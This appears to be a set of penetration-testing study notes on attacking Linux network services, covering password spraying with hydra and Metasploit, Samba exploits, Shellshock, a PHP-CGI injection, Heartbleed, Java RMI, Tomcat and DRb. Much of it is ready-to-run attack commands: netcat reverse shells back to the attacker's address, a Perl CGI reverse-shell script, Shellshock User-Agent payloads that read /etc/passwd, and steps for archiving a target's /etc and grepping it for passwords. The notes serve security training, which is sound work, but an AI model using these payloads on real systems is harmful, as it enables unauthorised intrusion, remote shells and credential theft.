# Linux Exploitation over the Network

## Password Spray Attack

[Reverse Brute Force Attack](https://en.wikipedia.org/wiki/Brute-force_attack#Reverse_brute-force_attack)  
[Statistcally Likely Usernames](https://github.com/insidetrust/statistically-likely-usernames)  
[The Harvester](https://github.com/laramies/theHarvester)  
[smtp-user-enum](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum)  
[smtp-enum](https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum)

`use auxiliary/scanner/smtp/smtp_enum`  
`set RHOSTS <<ip address>`  
`set USER_FILE users.txt`  
`run`

Then get valid_user.txt.

Then we will try to brute force 2 very common passwords.

`nmap -sT <ip address> --open --max-retries 1 -n`  
`hydra -L users.txt -P passwords.txt ssh://<ip address>`  
`hydra -l david -p Spring2018 -M ssh_servers.txt ssh`  
also can use smb_login from metasploit module.

also owa_login module from metasploiy module.

* * *

* * *

## Exploiting Samba

`nmap --script smb-os-discovery -p445 <ip address>`  
[searchsploit](https://www.exploit-db.com/searchsploit), [exloit-db.com](https://www.exploit-db.com/)

`searchsploit samba 3.0.20`

- *CVE-2007-2447*  
    `use exploit/multi/samba/usermap_script`  
    After exploit we will get a shell.  
    `python -c 'import pty; pty.spawn("/bin/sh")'`
- *Samba Symlink Directory Traversal*  
    Set widelinks in smb.conf to value yes.  
    `smbmap -H <ip address>`  
    Then use auxilary module samba symlink directory tarversal.  
    After running it we can seet rootfs symlink.  
    `smbclient \\\\<ip address>\\tmp -N`  
    change into rootfs directory and upload and download files using "get" and "put"  
    `cat passwd | less`  
    Another useful command is, `cd etc` and `tar c ../tmp/all_files.tar *`  
    Change to tmp folder and `ls -als all files.tar`  
    We can extract and enumerate:  
    `tar xf /tmp/all_files.tar`  
    `cd /tmp/rootfs/tmp/rootfs/etc/`  
    `grep -r "password" * 2>&1 /dev/null`
- *Writabe Samba Share to Remote Command Execution via Perl Reverse Shell*  
    `nmap --script smb-os-discovery <ip address> -p445`  
    `smbmap -H <ip address>` to get if any share has write access.  
    `smbclient \\\\<ip address>\\www -N`  
    We can then check perl command and start uploading our own script perl file.  
    `nmap -sT <ip address> --max-retries 1 -n --open`  
    We can upload [perl-reverse-shell.pl](http://perl-reverse-shell.pl) file to the directory using "put" and access through http.  
    Then we can get a reverse shell netcat listener.  
    `nc -nvlp 1234`
    Alternatively,
```perl
#!/usr/bin/perl

print "Content-type: text/html\n\n";
system("nc <our ip address> 1234 -e /bin/sh");
```

***
***

## Exploiting Shellshock
[shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) or bashdoor
It affected CGI programs in webservers.
- [CVE-vulerabilities](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#Initial_report_(CVE-2014-6271))

To check shellshock vunerability:
`env x='() {:;}; echo vulnerable' bash -c "echo this is a test"` this should print vulnerable.
`User-Agent: () {:;} ping -c 5 -p unique_string attacker.machine` this will confirm a system is vulnerablet to attacker machine.

`dirsearch.py -u http://192.168.1.3/ -e cgi -r` we will check for .cgi extension.
After finding extension file, `nmap --script-args uri=/cgi-bin/login.cgi <ip address> -p 80` for any shellshock exploitable vulnerabilities.

`wget -U "() {foo;}; echo \"Content-type: text/plain\"; echo; /bin/cat /etc/passwd" http://<ip address>/cgi-bin/login.cgi && cat login.cgi` for downloading files and viewing.

`nc -nvlp 1234` and for getting shell:
`wget-U "() {foo;}echo; /bin/nc <our ip address> 1234 -e /bin/sh" http://<ip address>/cgi-bin/login.cgi`
<br>
`curl -i -s -X 'POST' --data-binary "<?php system(\"nc <our ip address> 1234 -e /bin/sh\"); die; ?>" "http://<ip address>/cgi-bin/php5?%2dd+allow_url_include%3don+%2dd+safe_mode%3doff+%2dd+suhosin%2esimulation%3don+%2dd+disable_functions%3d%22%22+%2dd+open_baseddir%3dnone+%2dd+auto_prepend_file%3dphp%3a%2f%2finput+%2dd+cgi%2eforce_redirect%3d0+%2dd+cgi%2eredirect_status_env%3d0+%2dn"`

***
***

## Exploiting Heartbleed
[Hearbleed](https://heartbleed.com/)
`nmap --script ssl-heartbleed <ip address>` for checking if its vulnerable.

If its vulnerable we can use openssl_heartbleed module to dump encrypted memory.
also make sure `set action DUMP` We should run this module multiple times to get different results.

***
***

## Exploiting Java RMI Registry
[Java RMI](https://en.wikipedia.org/wiki/Java_remote_method_invocation), [Distributed Garbage Collection](https://web.archive.org/web/20190127220546/http:/java.sys-con.com/node/35865)

`nmap -sT <ip address> -p 1099 -sV` scan all ports sometimes can be found other ports too.
Then we can use java_rmi_server exploit from metasploit.

***
***

## Exploiting Java Deserialization
[Deserilization of untrusted data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)

More Info: [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
How to create small vulnerable environment: [https://web.archive.org/web/20160513025134/http:/www.zonksec.com/blog/hands-on-with-weblogic-serialization-vulnerability](https://web.archive.org/web/20160513025134/http:/www.zonksec.com/blog/hands-on-with-weblogic-serialization-vulnerability)

***
***

## Exploiting Tomcat
[Apache Tomcat](https://tomcat.apache.org/)

Check for default passwords if we are lucky we will be able to access the manger login page.

tomcat_mgr_login from metasploit module can be used to check for default credentials.

After login we can upload .war file. Then can get reverse shell. Please refer eJPT section for more details.

***
***

## Exploiting Drb RMI 

`nmap -sT <ip address> -p8787`
`nmap -sT -sV <ip address> -p8787`

Then search for drb in metasploit module. And use exploit to get shell.
***
***